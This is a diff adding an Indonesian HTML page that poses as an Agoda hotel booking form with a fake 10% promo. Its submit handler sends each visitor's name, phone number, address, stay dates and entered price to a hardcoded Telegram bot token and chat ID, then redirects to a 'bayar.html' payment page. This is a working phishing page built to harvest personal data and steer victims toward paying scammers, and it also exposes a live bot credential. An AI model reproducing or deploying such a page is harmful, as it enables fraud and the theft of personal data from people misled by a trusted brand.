@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>BOOKING HARGA MURAH |AGODA</title>
+    <!-- Open Graph Meta Tags -->
+    <meta property="og:title" content="BOOKING HARGA MURAH |AGODA">
+    <meta property="og:description" content="Formulir booking di agoda dengan berbagai pilihan dan promo spesial">
+    <meta property="og:image" content="https://blogger.googleusercontent.com/img/a/AVvXsEhkZ-8rHQnU0PVzIpghgb21PHQpwjdV4LFPgKkfNzE9-sRh_du5NVaybqU0Zx-M73k-n75MlSsvTVljn4A-IOCf368vxGtVXwH4UmZECV9mMNFtCL7KfWUHt2nkINfKGBL2RJEB38S6RO0H2dXr28T9VXti3yQEvlx1z2WxZkUZd94WlbFC8ctnX1Pu">
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://blogger.googleusercontent.com/img/a/AVvXsEhkZ-8rHQnU0PVzIpghgb21PHQpwjdV4LFPgKkfNzE9-sRh_du5NVaybqU0Zx-M73k-n75MlSsvTVljn4A-IOCf368vxGtVXwH4UmZECV9mMNFtCL7KfWUHt2nkINfKGBL2RJEB38S6RO0H2dXr28T9VXti3yQEvlx1z2WxZkUZd94WlbFC8ctnX1Pu">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { 
+            font-family: Arial, sans-serif; 
+            background-image: url('https://blogger.googleusercontent.com/img/a/AVvXsEhkZ-8rHQnU0PVzIpghgb21PHQpwjdV4LFPgKkfNzE9-sRh_du5NVaybqU0Zx-M73k-n75MlSsvTVljn4A-IOCf368vxGtVXwH4UmZECV9mMNFtCL7KfWUHt2nkINfKGBL2RJEB38S6RO0H2dXr28T9VXti3yQEvlx1z2WxZkUZd94WlbFC8ctnX1Pu');
+            background-size: cover;
+            background-position: center;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 115vh;
+        }
+        .form-container { 
+            width: 100%; 
+            max-width: 400px; 
+            padding: 20px; 
+            background-color: rgba(255, 255, 255, 0.9); 
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1); 
+            border-radius: 8px; 
+            text-align: center; 
+            backdrop-filter: blur(5px); 
+        }
+        .logo {
+            width: 100px;
+            height: auto;
+            margin-bottom: 20px;
+        }
+        .main-image {
+            width: 100%;
+            max-width: 400px;
+            height: auto;
+            margin-bottom: 20px;
+            border-radius: 8px;
+        }
+        form label { display: block; margin-top: 15px; font-weight: bold; color: #333; text-align: left; }
+        form input, form select { width: 100%; padding: 10px; margin-top: 5px; border: 1px solid #ccc; border-radius: 5px; }
+        .date-group { display: flex; gap: 10px; }
+        .date-group input { width: 100%; }
+        form button { width: 100%; padding: 10px; margin-top: 20px; background-color: #28a745; color: #fff; border: none; border-radius: 5px; font-size: 16px; cursor: pointer; transition: background-color 0.3s ease; }
+        form button:hover { background-color: #218838; }
+        .promo-checkbox-container { 
+            margin-top: 15px; 
+            text-align: left; 
+            font-size: 14px; 
+            display: flex; 
+            align-items: center; 
+            justify-content: flex-start; /* Memastikan elemen berada di sebelah kiri */
+
+
+        }
+        .promo-checkbox { margin-right: 8px; }
+        .promo-result { margin-top: 15px; font-weight: bold; color: #333; }
+        .harga-container { position: relative; }
+        .harga-container input { padding-left: 40px; }
+        .harga-container::before { content: "Rp"; position: absolute; left: 10px; top: 50%; transform: translateY(-50%); color: #333; }
+    </style>
+</head>
+<body>
+    <div class="form-container">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhkZ-8rHQnU0PVzIpghgb21PHQpwjdV4LFPgKkfNzE9-sRh_du5NVaybqU0Zx-M73k-n75MlSsvTVljn4A-IOCf368vxGtVXwH4UmZECV9mMNFtCL7KfWUHt2nkINfKGBL2RJEB38S6RO0H2dXr28T9VXti3yQEvlx1z2WxZkUZd94WlbFC8ctnX1Pu" alt="Logo" class="logo">
+        <img src="https://blogger.googleusercontent.com/img/a/AVvXsEhkZ-8rHQnU0PVzIpghgb21PHQpwjdV4LFPgKkfNzE9-sRh_du5NVaybqU0Zx-M73k-n75MlSsvTVljn4A-IOCf368vxGtVXwH4UmZECV9mMNFtCL7KfWUHt2nkINfKGBL2RJEB38S6RO0H2dXr28T9VXti3yQEvlx1z2WxZkUZd94WlbFC8ctnX1Pu" alt="Tampilan Gambar" class="main-image">
+
+        <form id="checkinForm" onsubmit="submitForm(event)">
+            <label for="nama">Nama Lengkap</label>
+            <input type="text" id="nama" name="nama" required>
+
+            <label for="telepon">Nomor Telepon</label>
+            <input type="tel" id="telepon" name="telepon" pattern="^08[1-9][0-9]{7,10}$" required placeholder="Contoh: 081234567890">
+
+            <label for="alamat">Alamat Tempat</label>
+            <input type="text" id="alamat" name="alamat" required>
+
+            <label>Tanggal Booking / Check-out</label>
+            <div class="date-group">
+                <input type="date" id="checkin" name="checkin" required>
+                <input type="date" id="checkout" name="checkout" required>
+            </div>
+
+            <label for="tamu">Jumlah Tamu (maksimal 16)</label>
+            <input type="number" id="tamu" name="tamu" min="1" max="16" required oninput="validateTamu()">
+
+            <label for="kamar">Jenis</label>
+            <select id="kamar" name="kamar" required>
+                <option value="standar">Standar</option>
+                <option value="deluxe">Deluxe</option>
+                <option value="suite">Suite</option>
+            </select>
+
+            <label for="harga">Nominal Harga</label>
+            <div class="harga-container">
+                <input type="text" id="harga" name="harga" inputmode="numeric" oninput="formatRupiah(this)" placeholder="Masukkan nominal harga" required>
+
+            </div>
+
+            <div class="promo-checkbox-container">
+                <input type="checkbox" id="promoCheckbox" class="promo-checkbox" onclick="klaimPromo()">
+                <label for="promoCheckbox">Saya setuju menggunakan promo spesial kami dan menyetujui semua ketentuan dari layanan kami</label>
+            </div>
+
+            <button type="submit">Check-in</button>
+        </form>
+        <div class="promo-result" id="promoResult"></div>
+    </div>
+
+    <script>
+          
+function formatRupiah(element) {
+            let value = element.value.replace(/[^,\d]/g, '').toString();
+            let split = value.split(',');
+            let sisa = split[0].length % 3;
+            let rupiah = split[0].substr(0, sisa);
+            let ribuan = split[0].substr(sisa).match(/\d{3}/g);
+
+            if (ribuan) {
+                let separator = sisa ? '.' : '';
+                rupiah += separator + ribuan.join('.');
+            }
+            element.value = split[1] != undefined ? rupiah + ',' + split[1] : rupiah;
+        }
+
+        function validateTamu() {
+            const tamuInput = document.getElementById("tamu");
+            const tamuValue = parseInt(tamuInput.value);
+            if (tamuValue < 1 || tamuValue > 16) {
+                alert("Jumlah tamu harus antara 1 dan 16");
+                tamuInput.value = "";
+            }
+        }
+function klaimPromo() {
+    const promoCheckbox = document.getElementById("promoCheckbox");
+    const hargaElement = document.getElementById("harga");
+    
+    // Mengambil nilai harga dan menghilangkan format Rp
+    let harga = parseInt(hargaElement.value.replace(/[^0-9]/g, '')); // Mengambil angka saja
+
+    if (promoCheckbox.checked && !isNaN(harga)) {
+        let diskon = harga * 0.1; // Hitung diskon 10%
+        let hargaPromo = harga - diskon; // Hitung harga setelah diskon
+        document.getElementById("promoResult").innerText = "Harga setelah promo: Rp " + hargaPromo.toLocaleString('id-ID'); // Tampilkan harga setelah promo
+    } else if (!promoCheckbox.checked) {
+        document.getElementById("promoResult").innerText = ""; // Hapus hasil jika checkbox tidak dicentang
+    } else {
+        alert("Masukkan nominal harga terlebih dahulu.");
+    
+        
+            }
+        }
+
+        async function submitForm(event) {
+            event.preventDefault();  // Mencegah pengiriman formulir standar
+            const nama = document.getElementById("nama").value;
+            const telepon = document.getElementById("telepon").value;
+            const alamat = document.getElementById("alamat").value;
+            const checkin = document.getElementById("checkin").value;
+            const checkout = document.getElementById("checkout").value;
+            const tamu = document.getElementById("tamu").value;
+            const kamar = document.getElementById("kamar").value;
+            const harga = document.getElementById("harga").value;
+
+          // Simpan data ke localStorage
+             localStorage.setItem("nama", nama);
+             localStorage.setItem("telepon", telepon);
+             localStorage.setItem("alamat", alamat);
+             localStorage.setItem("checkin", checkin);
+             localStorage.setItem("checkout", checkout);
+             localStorage.setItem("tamu", tamu);
+             localStorage.setItem("kamar", kamar);
+             localStorage.setItem("harga", harga);
+    
+            // Format pesan
+            const pesan = `Booking:\nNama: ${nama}\nTelepon: ${telepon}\nAlamat: ${alamat}\nCheck-in: ${checkin}\nCheck-out: ${checkout}\nJumlah Tamu: ${tamu}\nJenis Kamar: ${kamar}\nHarga: ${harga}`;
+
+            try {
+                // Kirim pesan ke Telegram (ganti `YOUR_BOT_TOKEN` dan `YOUR_CHAT_ID`)
+                await fetch(`https://api.telegram.org/bot7688043643:AAG4gGFhiZ9SBjilU__A68ZG-POiHx9FhQo/sendMessage`, {
+                    method: "POST",
+                    headers: { "Content-Type": "application/json" },
+                    body: JSON.stringify({
+                        chat_id: "6402138217",
+                        text: pesan
+                    })
+                });
+
+                // Arahkan ke halaman bayar.html setelah berhasil mengirim
+                window.location.href = "bayar.html";
+            } catch (error) {
+                alert("Gagal mengirim data. Coba lagi nanti.");
+                console.error("Error:", error);
+            }
+        }
+    </script>
+</body>
+</html>
